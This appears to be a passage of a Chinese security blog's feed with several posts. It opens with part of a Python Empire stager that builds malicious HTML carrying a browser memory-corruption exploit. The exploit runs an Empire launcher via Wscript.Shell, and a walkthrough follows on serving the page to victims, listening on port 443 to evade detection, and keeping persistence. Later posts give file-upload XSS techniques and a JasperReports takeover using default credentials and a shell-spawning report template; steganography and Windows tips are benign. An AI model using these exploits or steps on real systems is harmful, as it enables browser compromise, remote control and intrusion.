&amp; intToStr(addr) &amp; b\n"</span></span><br><span class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Dim o\n"</span></span><br><span class="line">code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            leakMem = o\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></span><br><span class="line">code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></span><br><span class="line">code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></span><br><span class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></span><br><span class="line">code += <span class="string">"        End Sub\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function exploit (arg1)\n"</span></span><br><span class="line">code += <span class="string">"            Dim addr\n"</span></span><br><span class="line">code += <span class="string">"            Dim csession\n"</span></span><br><span class="line">code += <span class="string">"            Dim olescript\n"</span></span><br><span class="line">code += <span class="string">"            Dim mem\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Set dm = New Dummy\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></span><br><span class="line">code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></span><br><span class="line">code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></span><br><span class="line">code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></span><br><span class="line">code += <span class="string">"    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></span><br><span class="line">code +=<span class="string">"Object.run(\""</span></span><br><span class="line">code += launcher + <span class="string">"\")\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function triggerBug\n"</span></span><br><span class="line">code += <span class="string">"            aw.Resize()\n"</span></span><br><span class="line">code += <span class="string">"            Dim i\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 32\n"</span></span><br><span class="line">code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></span><br><span class="line">code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"        function strToInt(s)\n"</span></span><br><span class="line">code += <span class="string">"        &#123;\n"</span></span><br><span class="line">code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></span><br><span class="line">code += <span class="string">"        &#125;\n"</span></span><br><span class="line">code += <span class="string">"        function intToStr(x)\n"</span></span><br><span class="line">code += <span class="string">"        &#123;\n"</span></span><br><span class="line">code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></span><br><span class="line">code += <span class="string">"        &#125;\n"</span></span><br><span class="line">code += <span class="string">"        var o;\n"</span></span><br><span class="line">code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></span><br><span class="line">code += <span class="string">"                triggerBug();\n"</span></span><br><span class="line">code += <span class="string">"                return 1;\n"</span></span><br><span class="line">code += <span class="string">"            &#125;&#125;;\n"</span></span><br><span class="line">code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></span><br><span class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/body&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/html&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>ms16.py</p><p>首先我们可以从<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener">Github</a>获取Empire</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p><p>现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。</p><p>我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>现在去生成我们的恶意HTML</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p><p>现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。&lt;br&gt;在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS姿势——文件上传XSS</title>
    <link href="http://zer0yu.github.io/2017/01/22/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS/"/>
    <id>http://zer0yu.github.io/2017/01/22/XSS姿势——文件上传XSS/</id>
    <published>2017-01-22T03:20:58.000Z</published>
    <updated>2017-01-22T03:21:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr><p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p><h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr><p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p><h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p><p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p><p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="noopener">W3Schools</a>练习这种XSS 。</p><h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="noopener">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p><p>例如：</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p><h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p><p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p><h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p><p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p><p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p><p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p><p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr><p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p><p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="noopener">here</a></p><p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="noopener">http://brutelogic.com.br/blog/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-简单介绍&quot;&gt;&lt;a href=&quot;#0x01-简单介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 简单介绍&quot;&gt;&lt;/a&gt;0x01 简单介绍&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PNG文件中的LSB隐写</title>
    <link href="http://zer0yu.github.io/2017/01/22/PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/"/>
    <id>http://zer0yu.github.io/2017/01/22/PNG文件中的LSB隐写/</id>
    <published>2017-01-22T03:19:59.000Z</published>
    <updated>2017-01-22T03:20:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>看到<a href="http://www.mottoin.com/88380.html" target="_blank" rel="noopener">Mott</a><a href="http://www.mottoin.com/88380.html" target="_blank" rel="noopener">oIn</a>的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。</p><p>环境：<strong>win10        python27</strong></p><p>lsb脚本使用了<a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="noopener">https://github.com/cyberinc/cloacked-pixel</a></p><p>在使用之前需要几个python包，主要说下win10下如何安装这些包</p><p><strong>1.PIL</strong></p><p>这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法：</p><p>到<a href="https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击" target="_blank" rel="noopener">https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击</a></p><p>主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用</p><p><strong>2.matplotlib</strong></p><p>这个包的安装直接参考官方网站的方法，注意一步一步来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br><span class="line">python -m pip install --upgrade numpy</span><br><span class="line">python -m pip install --upgrade pytz</span><br><span class="line">python -m pip install --upgrade pyparsing</span><br><span class="line">python -m pip install --upgrade cycler</span><br><span class="line">python -m pip install --upgrade matplotlib</span><br></pre></td></tr></table></figure><p>这就ok了，很简单。</p><p>接下来按照MottoIn这个玩就好了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看到&lt;a href=&quot;http://www.mottoin.com/88380.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mott&lt;/a&gt;&lt;a href=&quot;http://www.mottoin.com/88380.html&quot; target=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win10只有edge可以打开网页</title>
    <link href="http://zer0yu.github.io/2017/01/22/win10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5/"/>
    <id>http://zer0yu.github.io/2017/01/22/win10只有edge可以打开网页/</id>
    <published>2017-01-22T03:19:37.000Z</published>
    <updated>2017-01-22T03:19:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>按住win+x</p><p>然后选择“命令提示符（管理员）”</p><p>输入 netsh winsock reset</p><p>重启就好了。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;按住win+x&lt;/p&gt;
&lt;p&gt;然后选择“命令提示符（管理员）”&lt;/p&gt;
&lt;p&gt;输入 netsh winsock reset&lt;/p&gt;
&lt;p&gt;重启就好了。。&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hacking JasperReports-隐藏shell的特征</title>
    <link href="http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <id>http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-隐藏shell的特征/</id>
    <published>2017-01-22T02:59:14.000Z</published>
    <updated>2017-01-22T03:04:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p><p>也没有用多久我们就猜解出密码是“jasperadmin”</p><p>我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。</p><h4 id="代码和小脚本"><a href="#代码和小脚本" class="headerlink" title="代码和小脚本"></a>代码和小脚本</h4><p>JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。</p><p>JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。</p><p>我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。</p><h4 id="编辑模板"><a href="#编辑模板" class="headerlink" title="编辑模板"></a>编辑模板</h4><p>我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。</p><p>shell.jrxml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></span><br><span class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span 